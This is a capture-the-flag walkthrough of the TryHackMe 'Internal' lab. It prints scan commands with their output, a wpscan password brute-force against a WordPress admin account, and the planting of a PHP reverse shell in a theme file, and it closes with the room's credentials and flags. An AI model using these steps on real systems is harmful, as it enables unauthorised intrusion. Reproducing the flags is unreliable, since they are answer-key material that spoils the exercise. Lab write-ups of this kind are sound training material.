## 🧠 Room Overview: `Internal` - TryHackMe

🔒 Difficulty: `Hard`  
🕵️ Focus: `Enumeration`, `WordPress exploitation`, `Privilege Escalation`  
🧩 Tools: `nmap`, `wpscan`, `reverse shell`, `hydra`, `gobuster`
📄 Format: CTF-style with realistic internal network theme  
🚨 Goal: Gain initial foothold, escalate to root access, capture flags

<pre>
╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║     ████▓▓▓▓▒▒▒▒░░░░ INTERNAL SYSTEM TERMINAL ░░░░▒▒▒▒▓▓▓▓████                                                Walkthrough: TryHackMe Room        ║
║                                                                                                                                                ║
║                                                   .__        __                             .__                                               ║
║                                                   |__| _____/  |_  ___________  ____ _____  |  |                                              ║
║                                                   |  |/    \   __\/ __ \_  __ \/    \\__  \ |  |                                              ║
║                                                   |  |   |  \  | \  ___/|  | \/   |  \/ __ \|  |__                                            ║
║                                                   |__|___|  /__|  \___  >__|  |___|  (____  /____/                                            ║
║                                                           \/          \/           \/     \/                                                  ║
║                                                                                                                                                ║
║   ┌──────────────────────┐   ┌────────────┐   ┌────────────────────────────────────────────────────────────────────────────┐   ┌────────────┐  ║
║   │   ████████████       │   │ ALERT!!!   │   │   >>> SYSTEM CORE ENGAGED — ACCESS REQUIRED — CLASS: HARD                 │   │  STATUS ✔️ │  ║
║   │   ███░░░░░░████      │   └────────────┘   │   >>> Running network recon... ssh open... internal app found...         │   └────────────┘  ║
║   │   ███░░░░░░░░██      │                   │   >>> Brute-forcing... PrivEsc... Root shell obtained...                  │                   ║
║   │   ████████████       │                   │   >>> All logs redirected — logging disabled ████████████                 │                   ║
║   └──────────────────────┘                   └────────────────────────────────────────────────────────────────────────────┘                   ║
║                                                                                                                                                ║
║   Design by: NullSpecter404                                                                                                                   ║
╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
</pre>

first let's connect to vpn using openvpn
![connection](/home/kali/Pictures/openvpn_connection.png)

ok connection established by successfully now start the active recon using nmap
command used : nmap -sS -sC -sV -Pn -A "set here Your_IP_Machine"


kali@kali:~$ sudo nmap -A -sS -sC -sV -O set here Your_IP_Machine
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-17 18:34 CEST
Nmap scan report for 10.10.1.37
Host is up (0.056s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/17%OT=22%CT=1%CU=38220%PV=Y%DS=2%DC=T%G=Y%TM=5F8B1D
OS:26%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
OS:11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC
OS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   60.46 ms 10.8.0.1
2   60.58 ms 10.10.1.37

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.42 seconds



ok we have two open port ssh in port 22 (default port) and http in port 80 (default port)
server : Apache/2.4.29
WebSite running just in port 80

now let's use gobuster to know which directory we have
command used : gobuster dir -u http://Your_IP_Machine -w /usr/share/wordlists/dirb/common.txt

kali@kali:~$ gobuster dir -u http://Your_IP_Machine -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://internal.thm
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/17 18:36:40 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/blog (Status: 301)
/index.html (Status: 200)
/javascript (Status: 301)
/phpmyadmin (Status: 301)
/server-status (Status: 403)
/wordpress (Status: 301)
===============================================================
2020/10/17 18:36:59 Finished
===============================================================


ooooh we have worpress let's show the login page
Note : if you want to attack wordpress running in /blog not in /worpress because when enter wordpress an press login page or other button we redirect always to /blog
let's start the scan using wps scan tool
command used : wpscan --url http://internal.thm/blog -e u


kali@kali:~/CTFs/tryhackme/Internal$ wpscan --url http:///blog -e u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.1
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://Your_IP_Machine/blog/ [Your_IP_Machine]
[+] Started: Sat Oct 17 18:37:00 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://internal.thm/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Latest, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/
 | Last Updated: 2020-08-11T00:00:00.000Z
 | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 2.4
 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <=================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Sat Oct 17 18:37:11 2020
[+] Requests Done: 51
[+] Cached Requests: 7
[+] Data Sent: 11.81 KB
[+] Data Received: 472.077 KB
[+] Memory used: 155.973 MB
[+] Elapsed time: 00:00:11


we have user admin let's start attack the password
command used : wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt

kali@kali:~$ wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.1
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://Your_IP_Machine/blog/ [Your_IP_Machine]
[+] Started: Sat Oct 17 18:37:58 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://internal.thm/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Latest, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/
 | Last Updated: 2020-08-11T00:00:00.000Z
 | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 2.4
 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <==================> (21 / 21) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / my2boys
Trying admin / bratz1 Time: 00:02:33 <===================> (3885 / 3885) 100.00% Time: 00:02:33

[!] Valid Combinations Found:
 | Username: admin, Password: my2boys

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Sat Oct 17 18:41:32 2020
[+] Requests Done: 3910
[+] Cached Requests: 32
[+] Data Sent: 1.906 MB
[+] Data Received: 2.295 MB
[+] Memory used: 833.793 MB
[+] Elapsed time: 00:03:34

password found : my2boys
let's enter to admin Dashboard and install a php reverse shell
go to theme > themes editor > 404.php > paste you php reverse shell and save
start a listening using netcat
command used : nc -nlvp "port you are selected in reverse shell"
run in your browser : http://Your_IP_Machine/blog/wp-content/themes/twentyseventeen/404.php

and we get a shell but with www-data user permissions

kali@kali:~/CTFs/tryhackme/Internal$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [Your_IP] from (UNKNOWN) [Your_IP_Traget] 53194
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 16:41:43 up 9 min,  0 users,  load average: 0.59, 0.52, 0.25
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1071): Inappropriate ioctl for device
bash: no job control in this shell
www-data@internal:/$
let's show user we have in home directory
command used : ls /home
we have : aubreanna user

when i search i find wp-save.txt in opt directory let's show that
oh we have the aubreanna password
let's connect to user aubreanna in ssh
in aubreanna home we find a jenkins.txt
we have an ip adress in local network we need to use port forwarding using metsploit
after using hydra to attack jenkins password
and run simple php reverse shell in command console and we get a sheel
Note : running listening after running the command
ok in /opt directorie we have note.txt
ooohoo root password



user flag : THM{int3rna1_fl4g_1}
root flag : THM{d0ck3r_d3str0y3r}

